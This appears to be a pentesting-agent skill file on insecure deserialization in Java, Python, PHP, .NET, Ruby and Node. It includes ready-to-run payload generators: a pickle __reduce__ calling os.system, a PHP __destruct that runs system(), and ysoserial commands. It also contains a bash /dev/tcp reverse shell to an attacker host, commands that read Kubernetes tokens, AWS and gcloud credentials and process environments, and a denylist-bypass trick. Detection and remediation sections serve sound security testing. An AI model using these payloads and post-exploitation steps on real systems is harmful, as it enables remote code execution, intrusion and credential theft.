---
name: deserialization
description: Insecure deserialization (Java / Python / Ruby / .NET / PHP / Node) — gadget chain abuse, RCE pivots
triggers: [deserialization, pickle, ysoserial, gadget chain, java rmi, marshal, unserialize, jackson, fastjson]
---

# Insecure Deserialization

When an application reconstructs an object from attacker-controlled bytes without integrity checks, the *deserialiser itself* can be coerced into executing arbitrary code via gadget chains. The bug is always the same: untrusted serialised data is fed to a language-native deserializer that has side-effects-during-reconstruction. The exploit is language-specific.

CWE-502; A08:2021 (Software & Data Integrity Failures). Companion to `scan_deserialization`.

## Attack Surface

**Wire formats most often vulnerable**
- Java: `ObjectInputStream`, JSON via Jackson (with `@JsonTypeInfo`) / Fastjson / Gson polymorphic; `org.apache.commons.collections.*`
- Python: `pickle`, `cPickle`, `marshal`, `yaml.load()` (unsafe loader), `joblib`, `dill`
- Ruby: `Marshal.load`, YAML.load (Psych pre-3.1), ERB-rendered objects
- .NET: `BinaryFormatter` (deprecated; still in use), `XmlSerializer` with attacker-controlled type, `JSON.NET` with `TypeNameHandling=All`, `SoapFormatter`, `LosFormatter`
- PHP: `unserialize()` with magic methods (`__wakeup`, `__destruct`, `__toString`)
- Node: `node-serialize`, `funcster`, `serialize-javascript` with `unsafe: true`

**Where to find it**
- Session cookies (base64 of a serialised object — common in old Java apps)
- Hidden form fields with serialised view-state
- WebSocket / RPC payloads (Java RMI port 1099, JMX, JNDI)
- Cache stores with serialised values (Redis / Memcached writeback paths)
- File uploads accepted as `.pickle`, `.ser`, `.dat`, `.bin`
- Message queues (RabbitMQ / Kafka) with serialised message bodies

## Detection Channels

### Magic-byte fingerprinting
- Java serialised: starts with `AC ED 00 05` (hex) / `rO0` (base64)
- Python pickle: starts with `80 02..05` (protocol 2-5) or `\x80\x04`
- PHP serialise: starts with `O:N:"ClassName":` or `a:N:{...}`
- .NET BinaryFormatter: starts with `00 01 00 00 00 FF FF FF FF`
- Ruby Marshal: starts with `04 08`

Grep cookies, hidden fields, and request bodies for these signatures. Most apps don't bother wrapping their serialised data — the magic bytes are right there.

### Error-based
- Submit a truncated/corrupt blob → expect a deserialisation exception in the response
- Stack traces reveal class name + JVM/Python/Ruby version → confirms server-side deserialiser

### Gadget probes (low-impact)
- Java: ysoserial's `URLDNS` gadget — fires a DNS resolution. No RCE; safe to use in scope-limited engagements.
- Python: pickle of `os.system` arg `nslookup <oast-host>` — confirms exec without committing to a shell.
- .NET: ysoserial.net `TypeConfuseDelegate` with `cmd.exe nslookup <oast-host>`.

OAST-based probes are the safe confirmation channel. Run them before any payload that pops a shell.

## Operational Runbook

### Step 1 — fingerprint the language
```bash
# Pull all candidate base64 blobs from cookies + body fields
curl -s -i 'https://<TARGET>/session-endpoint' | grep -oE '[A-Za-z0-9+/]{40,}={0,2}'

# Decode and check magic bytes
for blob in $(...); do
  echo -n "$blob" | base64 -d 2>/dev/null | xxd | head -1
done
```

Match against the table above. If you see `rO0AB` → Java. `gASV` → Python pickle p4. `00 01 00 00 00 FF FF FF FF` → .NET BinaryFormatter.

### Step 2 — fire a quiet OAST gadget

**Java (ysoserial URLDNS)**
```bash
# Generate the payload
java -jar ysoserial-0.0.6.jar URLDNS "http://<oast-host>.oast.fun/strix-probe" > /tmp/payload.bin

# Re-encode + replace the original cookie/field value
PAYLOAD_B64=$(base64 -w0 /tmp/payload.bin)
curl -s -b "SESSIONID=${PAYLOAD_B64}" 'https://<TARGET>/protected'

# Confirm DNS hit
grep "strix-probe" /tmp/oast.log
```

**Python pickle**
```python
import pickle, base64, os
class Pwn:
    def __reduce__(self):
        return (os.system, ('curl http://<oast-host>.oast.fun/python-probe',))
payload = base64.b64encode(pickle.dumps(Pwn()))
print(payload.decode())
```

**.NET (ysoserial.net)**
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter \
  -c "cmd.exe /c nslookup strix.oast.fun" -o base64
```

**PHP**
```php
class Pwn {
  public $cmd = 'curl http://<oast-host>.oast.fun/php-probe';
  function __destruct() { system($this->cmd); }
}
echo urlencode(serialize(new Pwn()));
```

### Step 3 — confirm RCE (only when scope allows)

After OAST confirms the deserialiser executed something:

| Language | Gadget chain to RCE | Notes |
|---|---|---|
| Java | `CommonsCollections1..7`, `Spring1..2`, `Hibernate1..2` | ysoserial covers most |
| Python | `os.system` via `__reduce__` | Trivial; pickle is "exec-by-design" |
| .NET | `TypeConfuseDelegate`, `WindowsIdentity` | ysoserial.net |
| PHP | Magic-method chain across loaded classes | PHPGGC has 100+ pre-built chains |
| Ruby | `Gem::Installer` chain (Marshal-based) | universal-rce gem |
| Node | `IIFE`-via-`node-serialize` | trivial when `node-serialize` accepted |

```bash
# Java RCE shell-spawn — ONLY in authorized scope
java -jar ysoserial.jar CommonsCollections5 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' \
  | base64 -w0 > /tmp/rce.b64
```

### Step 4 — escalate to credential / pivot

Once RCE lands:
- `cat /var/run/secrets/kubernetes.io/serviceaccount/token` → cluster pivot
- `cat ~/.aws/credentials` / `cat /home/*/.config/gcloud/credentials.db` → cloud pivot
- `env | grep -i -E 'key|token|secret'` → secret enumeration
- `ls /proc/*/environ | xargs -I {} cat {}` → other processes' env

## Bypass Techniques

- **Length-prefix tampering**: Java's `ObjectInputStream.readUnshared()` differs from `readObject()` — sometimes blob is accepted by one path but rejected by the other.
- **Polymorphic JSON**: Jackson with `@JsonTypeInfo(use = Id.CLASS)` lets you smuggle arbitrary class names — gadget surface is huge.
- **Compression wrappers**: many apps gzip+base64 before deserialising; deflate your payload to match.
- **Bypass denylists**: when the app rejects `Runtime.exec` or `ProcessBuilder` keywords, use `ClassLoader.loadClass("java.lang.Runtime").getMethod("exec")` reflection chains.

## Validation

1. OAST DNS/HTTP callback fires from the server — confirms deserialiser executed an arbitrary primitive.
2. For RCE-class chains, demonstrate a benign read: `id; hostname; whoami` output captured via OAST exfil channel.
3. Re-run the probe with a benign blob → expect a deserialisation exception, confirming the server is in fact deserialising.
4. Document: language, deserialiser, gadget chain, payload size, response shape.

## False Positives

- Server-side **integrity-checked** serialisation: `JWT`-style HMAC on the blob, `EncryptedSession` in Rails / Phoenix / Django. The blob is signed; mutation breaks it. Still high-value to flag as "serialised state without HMAC" if you can prove it; otherwise low.
- Sandboxed deserialisers: Java's `safe-tools` or jackson-databind 2.10+ with `BasicPolymorphicTypeValidator` constraints. Verify the policy actually denies dangerous classes.
- Honeypots — some intrusion-detection tools return convincing OAST hits for blob-shaped requests. Re-run with a clean OAST host to confirm.

## Impact

- RCE on the application host — usually root or app-user; pivot from there.
- Identity / session takeover by swapping in a forged serialised user object.
- Mass data exfil via gadget chains that touch the ORM or filesystem.
- Lateral pivot into the wider service mesh (Redis writeback, RabbitMQ poisoning, JMX).

## Remediation

1. Don't deserialise untrusted input. Use a data-only format: JSON without polymorphism, Protobuf, MessagePack.
2. If polymorphic JSON is required, allow-list specific concrete classes (Jackson `PolymorphicTypeValidator`).
3. HMAC-sign every serialised blob that crosses a trust boundary; verify before deserialise.
4. Update deserialiser libraries: jackson-databind ≥ 2.10, fastjson ≥ 2.x (rewritten), pyyaml `safe_load` only.
5. Disable `BinaryFormatter` in .NET (deprecated; flagged in net5+).
6. Run a denylist of known-bad gadget classes (`commons-collections` `InvokerTransformer`, etc.) as defence-in-depth.

## Pro Tips

1. Always start with the OAST URLDNS / nslookup gadget — it confirms execution without committing to a payload your IDS will flag.
2. Decompile the app (`jadx` for Android Java, `dnSpy` for .NET) to find which gadget chains are reachable — the classpath determines what works.
3. ysoserial doesn't ship every gadget — PHP has `PHPGGC` which is the equivalent corpus.
4. For Jackson polymorphic, look at the `@JsonTypeInfo` annotations in the codebase — those are the entry points.
5. Cookie-borne serialised blobs are gold: every authenticated request fires the deserialiser. Test once; exploit indefinitely.

## Summary

If the app deserialises attacker-controlled bytes, you can usually find a gadget chain that reaches RCE. The mitigation is to not do that — switch to a format without object-reconstruction semantics, or HMAC the blob before trusting it.
